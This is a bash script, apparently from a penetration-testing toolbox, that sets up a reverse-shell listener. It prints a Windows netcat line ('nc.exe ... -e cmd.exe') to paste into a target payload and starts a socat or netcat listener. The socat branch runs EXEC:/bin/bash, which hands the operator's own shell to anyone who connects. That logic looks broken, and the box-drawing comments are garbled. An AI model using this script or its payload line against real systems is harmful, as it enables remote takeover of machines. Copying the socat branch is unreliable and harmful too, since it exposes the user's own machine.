#!/bin/bash
# â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
# â”‚ Version        : 2026.02.13-01                        â”‚
# â”‚ Author         : Mark Hamilton â”‚ Co-Pilot AI assisted â”‚
# â”‚ Script Purpose : Ethical Listener with Fallback       â”‚
# â”‚ Package        : toolbox                              â”‚
# â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
#
# Usage:
#   lstnr [--port <PORT>] [--dry-run] [--log] [--hashmap]
#
# Examples:
#   lstnr
#   lstnr --port 5555 --log --hashmap
#
# Description:
#   Starts a listener on a specified port using socat (preferred)
#   or netcat (fallback). Automatically binds to VPN IP if available,
#   otherwise falls back to default route IP.
#
# Output Files:
#   ~/Documents/listener.log          (when --log is used)
#   ~/Documents/.hashmap/lstnr.hash   (when --hashmap is used)
#   ~/Documents/.hashmap/lstnr.timestamp
#
# End Help

# â”€â”€ Metadata â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
TOOL_NAME="lstnr"
LOG_FILE="$HOME/Documents/listener.log"
HASH_DIR="$HOME/Documents/.hashmap"
TIMESTAMP_FILE="$HASH_DIR/${TOOL_NAME}.timestamp"
HASH_FILE="$HASH_DIR/${TOOL_NAME}.hash"

# â”€â”€ Parse Arguments â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
PORT=4444
DRYRUN=false
LOGGING=false
HASHMAP=false

while [[ $# -gt 0 ]]; do
  case "$1" in
    --port) PORT="$2"; shift ;;
    --dry-run) DRYRUN=true ;;
    --log) LOGGING=true ;;
    --hashmap) HASHMAP=true ;;
    --help)
        echo "Usage: lstnr [--port <PORT>] [--dry-run] [--log] [--hashmap]"
        exit 0 ;;
    *) echo "[!] Unknown option: $1"; exit 1 ;;
  esac
  shift
done

# â”€â”€ IP Detection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if [ -d /sys/class/net/tun0 ]; then
    IP=$(ip -o -4 addr show tun0 | awk '{print $4; exit}' | cut -d/ -f1)
    echo "Trying to use VPN IP address..."
else
    IP=$(ip route get 1 | awk '{print $7; exit}')
    echo "Trying to use default IP (VPN not available)..."
fi

if [ -z "$IP" ]; then
   echo "[!] No IP address detected. Check network connection."
   exit 1
fi

# â”€â”€ Display Info â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
echo -e "\n\e[32m[*] Listener Configuration:\e[0m"
echo -e "\e[34m    IP:\e[0m $IP"
echo -e "\e[34m    Port:\e[0m $PORT"
echo -e "\e[34m    Mode:\e[0m $( $DRYRUN && echo "Dry-run" || echo "Live")"
echo -e "\e[33mPaste into target payload:\e[0m"
echo -e "    nc.exe $IP $PORT -e cmd.exe\n"

# â”€â”€ Dry-run Exit â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
$DRYRUN && echo "[*] Dry-run complete. No listener started." && exit 0

# â”€â”€ Listener Selection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if command -v socat >/dev/null 2>&1; then
  echo "[*] Using socat listener..."
  CMD="socat -v TCP-LISTEN:$PORT,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
else
  echo "[*] Socat not found. Falling back to netcat..."
  CMD="nc -lvp $PORT"
fi

# â”€â”€ Logging Setup â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if $LOGGING; then
  mkdir -p "$(dirname "$LOG_FILE")"
  echo "[*] Logging enabled â†’ $LOG_FILE"
  $CMD 2>>"$LOG_FILE" | while read line; do
    echo "[LOG][$(date +'%H:%M:%S')] $line"
  done
else
  eval "$CMD"
fi

# â”€â”€ Hashmap Generation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if $HASHMAP; then
  mkdir -p "$HASH_DIR"
  echo "[*] Generating traceability files..."
  date +"%Y-%m-%d %H:%M:%S" > "$TIMESTAMP_FILE"
  sha256sum "$0" > "$HASH_FILE"
  echo "[*] Timestamp â†’ $TIMESTAMP_FILE"
  echo "[*] Hash â†’ $HASH_FILE"
fi

echo "ğŸ§ Listener session ended."
